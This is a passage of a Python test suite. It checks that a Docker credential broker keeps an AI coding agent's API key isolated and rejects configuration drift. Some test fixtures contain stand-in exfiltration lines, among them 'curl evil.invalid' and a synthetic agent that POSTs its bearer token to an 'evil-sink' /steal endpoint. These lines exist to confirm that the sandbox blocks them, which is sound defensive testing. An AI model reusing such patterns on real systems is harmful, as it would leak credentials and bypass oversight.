                    "GlobalIPv6Address": "",
                    "IPv6Gateway": "",
                },
                session.network_name: {"Aliases": [BROKER_ALIAS]},
            },
            "Ports": {},
        },
    }


@pytest.mark.parametrize(
    "drift",
    (
        "command",
        "entrypoint",
        "environment",
        "healthcheck",
        "user",
        "exposed-port",
        "published-port",
        "runtime-port",
        "tmpfs",
        "source-mount",
        "auto-remove",
        "cap-add",
        "extra-host",
        "link",
        "pid-mode",
        "security-option",
        "userns-mode",
        "working-directory",
    ),
)
def test_controller_rejects_broker_runtime_identity_drift(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    drift: str,
) -> None:
    """Every broker launch surface inspected after start is exact and fail closed."""
    session = _controller_session(monkeypatch)
    session._broker_container_id = "b" * 64
    session._broker_image_id = "sha256:" + "9" * 64
    record = _broker_runtime_record(session, tmp_path)
    config = record["Config"]
    host = record["HostConfig"]
    network = record["NetworkSettings"]
    mounts = record["Mounts"]
    assert isinstance(config, dict)
    assert isinstance(host, dict)
    assert isinstance(network, dict)
    assert isinstance(mounts, list)
    if drift == "command":
        config["Cmd"] = ["-B", "/unapproved.py"]
    elif drift == "entrypoint":
        config["Entrypoint"] = ["sh"]
    elif drift == "environment":
        environment = config["Env"]
        assert isinstance(environment, list)
        environment.append("HTTPS_PROXY=http://evil.invalid:80")
    elif drift == "healthcheck":
        config["Healthcheck"] = {"Test": ["CMD-SHELL", "curl evil.invalid"]}
    elif drift == "user":
        config["User"] = "0:0"
    elif drift == "exposed-port":
        config["ExposedPorts"] = {"8765/tcp": {}}
    elif drift == "published-port":
        host["PortBindings"] = {"8765/tcp": [{"HostPort": "8765"}]}
    elif drift == "runtime-port":
        network["Ports"] = {"8765/tcp": [{"HostPort": "8765"}]}
    elif drift == "tmpfs":
        host["Tmpfs"] = {"/tmp": "rw", "/escape": "rw"}
    elif drift == "source-mount":
        mount = mounts[0]
        assert isinstance(mount, dict)
        mount["RW"] = True
    elif drift == "auto-remove":
        host["AutoRemove"] = True
    elif drift == "cap-add":
        host["CapAdd"] = ["SYS_PTRACE"]
    elif drift == "extra-host":
        host["ExtraHosts"] = ["host.docker.internal:host-gateway"]
    elif drift == "link":
        host["Links"] = ["evil:evil"]
    elif drift == "pid-mode":
        host["PidMode"] = "host"
    elif drift == "security-option":
        host["SecurityOpt"] = ["no-new-privileges:false"]
    elif drift == "userns-mode":
        host["UsernsMode"] = "host"
    else:
        assert drift == "working-directory"
        config["WorkingDir"] = "/tmp"
    monkeypatch.setattr(session, "_inspect_container", lambda name: record)
    with pytest.raises(broker_controller.CredentialBrokerError):
        session._verify_broker_runtime_state()


def test_controller_accepts_exact_broker_runtime_identity(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The exact source mounts, process identity, and no-port topology are accepted."""
    session = _controller_session(monkeypatch)
    session._broker_container_id = "b" * 64
    session._broker_image_id = "sha256:" + "9" * 64
    record = _broker_runtime_record(session, tmp_path)
    monkeypatch.setattr(session, "_inspect_container", lambda name: record)
    session._verify_broker_runtime_state()


def _docker_fixture_ready() -> bool:
    docker = shutil.which("docker")
    if docker is None:
        return False
    for arguments in (("info",), ("image", "inspect", DOCKER_TEST_IMAGE)):
        result = subprocess.run(
            (docker, *arguments),
            capture_output=True,
            check=False,
            timeout=20,
        )
        if result.returncode != 0:
            return False
    return True


def _require_docker_fixture() -> None:
    """Require the real topology fixture in CI and skip only local unprepared runs."""
    if _docker_fixture_ready():
        return
    message = f"needs a running Docker daemon and preloaded {DOCKER_TEST_IMAGE}"
    if os.environ.get(REQUIRE_REAL_DOCKER_TESTS_ENV) == "1":
        pytest.fail(f"{message}; {REQUIRE_REAL_DOCKER_TESTS_ENV}=1")
    pytest.skip(message)


def _docker(
    arguments: Sequence[str],
    *,
    environment: Mapping[str, str] | None = None,
    check: bool = True,
    timeout: int = 30,
) -> subprocess.CompletedProcess[str]:
    docker = shutil.which("docker")
    assert docker is not None
    result = subprocess.run(
        (docker, *arguments),
        capture_output=True,
        check=False,
        env=None if environment is None else dict(environment),
        text=True,
        timeout=timeout,
    )
    if check and result.returncode != 0:
        raise AssertionError(
            f"Docker fixture command failed ({result.returncode}): {result.stderr.strip()}"
        )
    return result


def _wait_for_broker_ready(audit_path: Path, broker_name: str) -> None:
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline:
        if audit_path.is_file() and audit_path.stat().st_size:
            return
        state = _docker(("container", "inspect", "--format", "{{.State.Running}}", broker_name))
        if state.stdout.strip() != "true":
            break
        time.sleep(0.05)
    logs = _docker(("logs", broker_name), check=False)
    raise AssertionError(f"synthetic Docker broker did not become ready: {logs.stderr}")


def _write_docker_sink_server(path: Path) -> None:
    path.write_text(
        """from __future__ import annotations
import json
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

record = Path(sys.argv[2])
kind = sys.argv[3]

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', '0'))
        body = self.rfile.read(length).decode('utf-8')
        record.write_text(json.dumps({
            'authorization': self.headers.get('Authorization'),
            'body': body,
            'kind': kind,
            'path': self.path,
        }, sort_keys=True), encoding='utf-8')
        response = b'{\"provider\":\"ok\"}\\n'
        self.send_response(200)
        self.send_header('Content-Length', str(len(response)))
        self.end_headers()
        self.wfile.write(response)

    do_GET = do_POST

    def log_message(self, format, *args):
        pass

ThreadingHTTPServer(('0.0.0.0', int(sys.argv[1])), Handler).serve_forever()
""",
        encoding="utf-8",
    )


def _write_docker_agent(
    path: Path,
    *,
    external_dns_canary: str,
    gateway_canary: str,
    mode: str,
) -> None:
    if mode not in {"approved", "router-rejection"}:
        raise ValueError("Docker agent mode is invalid")
    path.write_text(
        f"""from __future__ import annotations
import http.client
import json
import os
import socket
import sys
from pathlib import Path
from urllib.parse import urlsplit

EXTERNAL_DNS_CANARY = {external_dns_canary!r}
GATEWAY_CANARY = {gateway_canary!r}
MODE = {mode!r}

lease = os.environ['OPENAI_API_KEY']
if len(sys.argv) != 3 or sys.argv[1] != '--config':
    raise RuntimeError('signed Codex routing projection is missing')
setting_name, encoded_base = sys.argv[2].split('=', 1)
if setting_name != 'openai_base_url':
    raise RuntimeError('signed Codex routing key drifted')
base = json.loads(encoded_base)

def resolve(host, port):
    try:
        records = socket.getaddrinfo(host, port, type=socket.SOCK_STREAM)
    except Exception as exc:
        return {{'addresses': [], 'error_type': type(exc).__name__, 'resolved': False}}
    addresses = sorted({{record[4][0] for record in records}})
    return {{'addresses': addresses, 'error_type': None, 'resolved': bool(addresses)}}

def connect(host, port):
    resolution = resolve(host, port)
    try:
        connection = socket.create_connection((host, port), timeout=1)
    except Exception as exc:
        return {{**resolution, 'error_type': type(exc).__name__, 'failed': True}}
    connection.close()
    return {{**resolution, 'error_type': None, 'failed': False}}

result = {{
    'credentials_path_exists': Path('/credentials').exists(),
    'projected_arguments': ['--config', sys.argv[2]],
    'projected_environment': {{'OPENAI_API_KEY': lease}},
}}

if MODE == 'approved':
    parsed_base = urlsplit(base)
    result['broker_resolution'] = resolve(parsed_base.hostname, parsed_base.port)
    approved_connection = http.client.HTTPConnection(
        parsed_base.hostname,
        parsed_base.port,
        timeout=5,
    )
    approved_connection.request(
        'POST',
        parsed_base.path + '/responses',
        body=b'{{"input":"synthetic"}}',
        headers={{
            'Authorization': 'Bearer ' + lease,
            'Content-Type': 'application/json',
        }},
    )
    approved_response = approved_connection.getresponse()
    result['approved'] = {{
        'body': approved_response.read().decode('utf-8'),
        'status': approved_response.status,
    }}
    approved_connection.close()
    result['direct_provider'] = connect('approved-provider', 8080)
    result['evil_sink'] = connect('evil-sink', 8080)
    result['gateway_ip'] = connect(GATEWAY_CANARY, 8080)
    result['host_docker_internal'] = connect('host.docker.internal', 8080)
    result['gateway_docker_internal'] = connect('gateway.docker.internal', 8080)
    result['arbitrary_ip'] = connect('192.0.2.1', 80)
    result['external_dns_canary'] = resolve(EXTERNAL_DNS_CANARY, 443)
else:
    router = http.client.HTTPConnection('stinger-credential-broker', 8765, timeout=5)
    router.putrequest('POST', 'http://evil-sink:8080/steal', skip_host=True)
    router.putheader('Host', 'stinger-credential-broker:8765')
    router.putheader('Authorization', 'Bearer ' + lease)
    router.putheader('Content-Length', '2')
    router.endheaders(b'{{}}')
    router_response = router.getresponse()
    result['broker_router_status'] = router_response.status
    router_response.read()
    router.close()

Path('/work/result.json').write_text(json.dumps(result, sort_keys=True), encoding='utf-8')
deadline = __import__('time').monotonic() + 15
while not Path('/work/release').exists() and __import__('time').monotonic() < deadline:
    __import__('time').sleep(0.05)
""",
        encoding="utf-8",
    )


def _exercise_real_docker_topology(
    tmp_path: Path,
    *,
    mode: str,
) -> None:
    """Exercise one hostile-agent mode against Docker with local-only HTTP endpoints."""
    suffix = uuid4().hex[:12]
    internal_network = f"stinger-test-internal-{suffix}"
    provider_network = f"stinger-test-provider-{suffix}"
    provider_name = f"stinger-test-provider-{suffix}"
    evil_name = f"stinger-test-evil-{suffix}"
    broker_name = f"stinger-test-broker-{suffix}"
    agent_name = f"stinger-test-agent-{suffix}"
    container_names = (agent_name, broker_name, provider_name, evil_name)
    network_names = (internal_network, provider_network)

    workdir = tmp_path / "agent-workdir"
    provider_evidence = tmp_path / "provider-evidence"
    evil_evidence = tmp_path / "evil-evidence"
    broker_config_dir = tmp_path / "broker-config"
    broker_audit_dir = tmp_path / "broker-audit"
    for directory in (
        workdir,
        provider_evidence,
        evil_evidence,
        broker_config_dir,
        broker_audit_dir,
    ):
        directory.mkdir()
    sink_server = tmp_path / "sink_server.py"
    _write_docker_sink_server(sink_server)
    agent_script = workdir / "agent.py"
    provider_record = provider_evidence / "provider.json"
    evil_record = evil_evidence / "evil.json"
    config_path = broker_config_dir / "config.json"
    audit_path = broker_audit_dir / "audit.jsonl"
    _write_configuration(
        config_path,
        _test_configuration("http://approved-provider:8080"),
    )
    config_path.chmod(0o400)
    uid_gid = f"{os.getuid()}:{os.getgid()}" if hasattr(os, "getuid") else "65534:65534"

    try:
        _docker(("network", "create", provider_network))
        _docker(
            (
                "network",
                "create",
                "--driver",
                "bridge",
                "--internal",
                "--ipv6=false",
                "--opt",
                "com.docker.network.bridge.gateway_mode_ipv4=isolated",
                "--opt",
                "com.docker.network.enable_ipv4=true",
                "--label",
                "stinger.credential-isolation=protocol-2",
                internal_network,
            )
        )
        created_network_inspection = json.loads(
            _docker(("network", "inspect", internal_network)).stdout
        )[0]
        ipam_configurations = created_network_inspection["IPAM"]["Config"]
        assert isinstance(ipam_configurations, list)
        assert len(ipam_configurations) == 1
        subnet = ipaddress.ip_network(ipam_configurations[0]["Subnet"])
        assert isinstance(subnet, ipaddress.IPv4Network)
        gateway_canary = str(subnet.network_address + 1)
        _write_docker_agent(
            agent_script,
            external_dns_canary="example.com",
            gateway_canary=gateway_canary,
            mode=mode,
        )
        common_sink = (
            "--detach",
            "--read-only",
            "--cap-drop",
            "ALL",
            "--security-opt",
            "no-new-privileges",
            "--tmpfs",
            "/tmp:rw,noexec,nosuid,nodev,size=16m,mode=1777",
            "--user",
            uid_gid,
            "--network",
            provider_network,
            "--volume",
            f"{sink_server}:/opt/sink_server.py:ro",
            "--entrypoint",
            "python",
        )
        _docker(
            (
                "run",
                "--name",
                provider_name,
                "--network-alias",
                "approved-provider",
                "--volume",
                f"{provider_evidence}:/evidence:rw",
                *common_sink,
                DOCKER_TEST_IMAGE,
                "-B",
                "/opt/sink_server.py",
                "8080",
                "/evidence/provider.json",
                "provider",
            )
        )
        _docker(
            (
                "run",
                "--name",
                evil_name,
                "--network-alias",
                "evil-sink",
                "--volume",
                f"{evil_evidence}:/evidence:rw",
                *common_sink,
                DOCKER_TEST_IMAGE,
                "-B",
                "/opt/sink_server.py",
                "8080",
                "/evidence/evil.json",
                "evil",
            )
        )

        broker_environment = dict(os.environ)
        broker_environment[BROKER_RAW_CREDENTIAL_ENV] = RAW_CREDENTIAL
        broker_environment[BROKER_LEASE_ENV] = BROKER_LEASE
        _docker(
            (
                "run",
                "--detach",
                "--name",
                broker_name,
                "--network",
                provider_network,
                "--workdir",
                "/",
                "--read-only",
                "--cap-drop",
                "ALL",
                "--security-opt",
                "no-new-privileges",
                "--no-healthcheck",
                "--sysctl",
                "net.ipv4.conf.all.forwarding=0",
                "--sysctl",
                "net.ipv6.conf.all.forwarding=0",
                "--tmpfs",
                "/tmp:rw,noexec,nosuid,nodev,size=16m,mode=1777",
                "--volume",
                f"{REPOSITORY / 'src/stinger/credential_broker_server.py'}:{BROKER_SERVER_PATH}:ro",
                "--volume",
                f"{config_path}:{BROKER_CONFIG_PATH}:ro",
                "--volume",
                f"{broker_audit_dir}:/evidence:rw",
                "--env",
                BROKER_RAW_CREDENTIAL_ENV,
                "--env",
                BROKER_LEASE_ENV,
                "--env",
                "PYTHONDONTWRITEBYTECODE=1",
                "--env",
                "PYTHONHASHSEED=0",
                "--user",
                uid_gid,
                "--entrypoint",
                "python",
                DOCKER_TEST_IMAGE,
                "-B",
                BROKER_SERVER_PATH,
                BROKER_CONFIG_PATH,
                BROKER_AUDIT_PATH,
                broker_server.TEST_ONLY_ARGUMENT,
            ),
            environment=broker_environment,
        )
        _docker(
            (
                "network",
                "connect",
                "--alias",
                BROKER_ALIAS,
                internal_network,
                broker_name,
            )
        )
        _wait_for_broker_ready(audit_path, broker_name)

        agent_environment = dict(os.environ)
        agent_environment["OPENAI_API_KEY"] = BROKER_LEASE
        broker_base_url = f"http://{BROKER_ALIAS}:8765/openai/v1"
        agent = _docker(
            (
                "run",
                "--detach",
                "--name",
                agent_name,
                "--workdir",
                "/work",
                "--volume",
                f"{workdir}:/work:rw",
                "--env",
                "OPENAI_API_KEY",
                "--env",
                "PYTHONDONTWRITEBYTECODE=1",
                "--env",
                "PYTHONHASHSEED=0",
                "--env",
                "HOME=/tmp",
                "--cap-drop",
                "ALL",
                "--security-opt",
                "no-new-privileges",
                "--no-healthcheck",
                "--dns",
                "127.0.0.1",
                "--dns-search=.",
                "--dns-option",
                "timeout:1",
                "--dns-option",
                "attempts:1",
                "--sysctl",
                "net.ipv4.conf.all.forwarding=0",
                "--sysctl",
                "net.ipv6.conf.all.forwarding=0",
                "--user",
                uid_gid,
                "--network",
                internal_network,
                "--entrypoint",
                "python",
                DOCKER_TEST_IMAGE,
                "-B",
                "/work/agent.py",
                "--config",
                f'openai_base_url="{broker_base_url}"',
            ),
            environment=agent_environment,
            check=False,
            timeout=30,
        )
        assert agent.returncode == 0, agent.stderr

        deadline = time.monotonic() + 15
        result_path = workdir / "result.json"
        while time.monotonic() < deadline and not result_path.exists():
            state = _docker(("container", "inspect", "--format", "{{.State.Running}}", agent_name))
            if state.stdout.strip() != "true":
                break
            time.sleep(0.05)
        if not result_path.exists():
            logs = _docker(("logs", agent_name), check=False)
            raise AssertionError(f"synthetic agent produced no result: {logs.stderr}")
        live_network_inspection = json.loads(
            _docker(("network", "inspect", internal_network)).stdout
        )[0]
        (workdir / "release").write_text("release\n", encoding="utf-8")
        waited = _docker(("container", "wait", agent_name), check=False)
        if waited.stdout.strip() != "0":
            logs = _docker(("logs", agent_name), check=False)
            raise AssertionError(f"synthetic agent failed: {logs.stderr}")

        result = json.loads(result_path.read_text(encoding="utf-8"))
        agent_inspection = json.loads(_docker(("container", "inspect", agent_name)).stdout)[0]
        broker_inspection = json.loads(_docker(("container", "inspect", broker_name)).stdout)[0]
        post_agent_network_inspection = json.loads(
            _docker(("network", "inspect", internal_network)).stdout
        )[0]
        stopped = _docker(
            ("container", "stop", "--timeout", "10", broker_name),
            check=False,
            timeout=20,
        )
        assert stopped.returncode == 0, stopped.stderr
        assert stopped.stdout.strip() == broker_name
        broker_stopped_inspection = json.loads(
            _docker(("container", "inspect", broker_name)).stdout
        )[0]

        assert result["credentials_path_exists"] is False
        assert result["projected_arguments"] == [
            "--config",
            f'openai_base_url="{broker_base_url}"',
        ]
        assert result["projected_environment"] == {"OPENAI_API_KEY": BROKER_LEASE}
        assert not evil_record.exists()

        if mode == "approved":
            provider_observation = json.loads(provider_record.read_text(encoding="utf-8"))
            assert result["approved"] == {
                "body": '{"provider":"ok"}\n',
                "status": 200,
            }
            broker_internal_ip = broker_inspection["NetworkSettings"]["Networks"][internal_network][
                "IPAddress"
            ]
            assert result["broker_resolution"] == {
                "addresses": [broker_internal_ip],
                "error_type": None,
                "resolved": True,
            }
            for target in (
                "direct_provider",
                "evil_sink",
                "gateway_ip",
                "host_docker_internal",
                "gateway_docker_internal",
                "arbitrary_ip",
            ):
                assert result[target]["failed"] is True, target
            assert result["external_dns_canary"]["resolved"] is False
            assert result["external_dns_canary"]["addresses"] == []
            assert provider_observation["authorization"] == f"Bearer {RAW_CREDENTIAL}"
            assert provider_observation["path"] == APPROVED_UPSTREAM_PATH
        else:
            assert mode == "router-rejection"
            assert result["broker_router_status"] == 403
            assert not provider_record.exists()

        serialized_result = json.dumps(result, sort_keys=True)
        serialized_agent = json.dumps(agent_inspection, sort_keys=True)
        assert RAW_CREDENTIAL not in serialized_result
        assert RAW_CREDENTIAL not in serialized_agent
        agent_environment_values = agent_inspection["Config"]["Env"]
        assert f"OPENAI_API_KEY={BROKER_LEASE}" in agent_environment_values
        assert not any(value.startswith("OPENAI_BASE_URL=") for value in agent_environment_values)
        assert all(RAW_CREDENTIAL not in value for value in agent_environment_values)
        assert {mount["Destination"] for mount in agent_inspection["Mounts"]} == {"/work"}
        assert all(mount["Destination"] != "/credentials" for mount in agent_inspection["Mounts"])
        assert set(agent_inspection["NetworkSettings"]["Networks"]) == {internal_network}
        agent_config = agent_inspection["Config"]
        assert agent_config["Cmd"][-2:] == [
            "--config",
            f'openai_base_url="{broker_base_url}"',
        ]
        agent_host = agent_inspection["HostConfig"]
        agent_state = agent_inspection["State"]
        assert agent_config["Healthcheck"] == {"Test": ["NONE"]}
        assert agent_state.get("Health") in (None, {})
        assert agent_host["Dns"] == ["127.0.0.1"]
        assert agent_host["DnsSearch"] == ["."]
        assert agent_host["DnsOptions"] == ["timeout:1", "attempts:1"]
        agent_attachment = agent_inspection["NetworkSettings"]["Networks"][internal_network]
        assert agent_attachment.get("Gateway") in (None, "")
        assert agent_attachment.get("IPv6Gateway") in (None, "")
        assert agent_attachment.get("GlobalIPv6Address") in (None, "")

        members = {value["Name"] for value in live_network_inspection["Containers"].values()}
        assert members == {agent_name, broker_name}
        assert live_network_inspection["Internal"] is True
        assert live_network_inspection["EnableIPv4"] is True
        assert live_network_inspection["EnableIPv6"] is False
        assert live_network_inspection["Options"] == {
            "com.docker.network.bridge.gateway_mode_ipv4": "isolated",
            "com.docker.network.enable_ipv4": "true",
        }
        assert broker_controller._network_ipam_is_isolated(live_network_inspection["IPAM"])
        assert set(live_network_inspection["IPAM"]["Config"][0]) == {"Subnet"}
        assert {
            value["Name"] for value in post_agent_network_inspection["Containers"].values()
        } == {broker_name}
        assert set(broker_inspection["NetworkSettings"]["Networks"]) == {
            internal_network,
            provider_network,
        }
        broker_internal_attachment = broker_inspection["NetworkSettings"]["Networks"][
            internal_network
        ]
        assert broker_internal_attachment.get("Gateway") in (None, "")
        assert broker_internal_attachment.get("IPv6Gateway") in (None, "")
        assert broker_internal_attachment.get("GlobalIPv6Address") in (None, "")
        assert {mount["Destination"] for mount in broker_inspection["Mounts"]} == {
            BROKER_SERVER_PATH,
            BROKER_CONFIG_PATH,
            "/evidence",
        }
        broker_config = broker_inspection["Config"]
        broker_host = broker_inspection["HostConfig"]
        assert broker_config["Entrypoint"] == ["python"]
        assert broker_config["Healthcheck"] == {"Test": ["NONE"]}
        assert broker_config["Cmd"] == [
            "-B",
            BROKER_SERVER_PATH,
            BROKER_CONFIG_PATH,
            BROKER_AUDIT_PATH,
            broker_server.TEST_ONLY_ARGUMENT,
        ]
        assert broker_config["User"] == uid_gid
        assert broker_config["WorkingDir"] == "/"
        assert broker_config.get("ExposedPorts") in (None, {})
        assert broker_host.get("PortBindings") in (None, {})
        assert broker_host["PublishAllPorts"] is False
        assert set(broker_host["Tmpfs"]) == {"/tmp"}
        assert broker_host["ReadonlyRootfs"] is True
        assert broker_host["CapDrop"] == ["ALL"]
        assert any(value.startswith("no-new-privileges") for value in broker_host["SecurityOpt"])
        broker_environment_values = broker_config["Env"]
        assert f"{BROKER_RAW_CREDENTIAL_ENV}={RAW_CREDENTIAL}" in broker_environment_values
        assert f"{BROKER_LEASE_ENV}={BROKER_LEASE}" in broker_environment_values
        assert broker_stopped_inspection["State"]["Running"] is False
        assert broker_stopped_inspection["State"]["ExitCode"] == 0

        events = _audit_events(audit_path)
        if mode == "approved":
            assert [event["decision"] for event in events] == [
                "ready",
                "attempt",
                "allowed",
                "quiesced",
            ]
            assert events[1]["request_id"] == 1
            assert events[2]["request_id"] == 1
        else:
            assert [event["decision"] for event in events] == [
                "ready",
                "rejected",
                "quiesced",
            ]
            assert events[1]["request_id"] == 1
            assert events[1]["reason"] == "request target is not an exact origin-form path"
        assert events[-1]["request_count"] == 1
    finally:
        for name in container_names:
            _docker(("container", "rm", "--force", name), check=False)
        for name in network_names:
            _docker(("network", "rm", name), check=False)


def test_real_docker_agent_cannot_read_or_bypass_synthetic_broker(
    tmp_path: Path,
) -> None:
    """The approved call works without opening another network or DNS destination."""
    _require_docker_fixture()
    _exercise_real_docker_topology(tmp_path, mode="approved")


def test_real_docker_broker_as_router_fails_closed(
    tmp_path: Path,
) -> None:
    """An absolute-form target cannot turn the broker into an egress router."""
    _require_docker_fixture()
    _exercise_real_docker_topology(tmp_path, mode="router-rejection")


def test_real_controller_start_and_abort_use_dedicated_broker_network(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The production controller creates, attests, and removes its synthetic-key topology."""
    _require_docker_fixture()
    runtime = observe_docker_runtime()
    image_id = _docker(
        ("image", "inspect", "--format", "{{.Id}}", DOCKER_TEST_IMAGE)
    ).stdout.strip()
    assert image_id.startswith("sha256:")
    monkeypatch.setenv("OPENAI_API_KEY", RAW_CREDENTIAL)
    config = AgentConfig(
        adapter="codex",
        model="synthetic-model",
        provider=ProviderId.OPENAI,
        api_key_env="OPENAI_API_KEY",
        container_image=DOCKER_TEST_IMAGE,
        container_image_digest=image_id,
        credential_broker=CredentialBrokerConfiguration(
            image=DOCKER_TEST_IMAGE,
            image_digest=image_id,
        ),
    )
    session = broker_controller.CredentialBrokerSession(
        config,
        runtime=runtime,
        repository=REPOSITORY,
    )

    session.start()
    try:
        broker_record = session._inspect_container(session.broker_container_name)
        networks = broker_record["NetworkSettings"]["Networks"]
        assert set(networks) == {session.network_name, session.outbound_network_name}
        assert "bridge" not in networks
        session._verify_outbound_network_membership()
    finally:
        session.abort()

    listed = set(_docker(("network", "ls", "--format", "{{.Name}}")).stdout.splitlines())
    assert session.network_name not in listed
    assert session.outbound_network_name not in listed
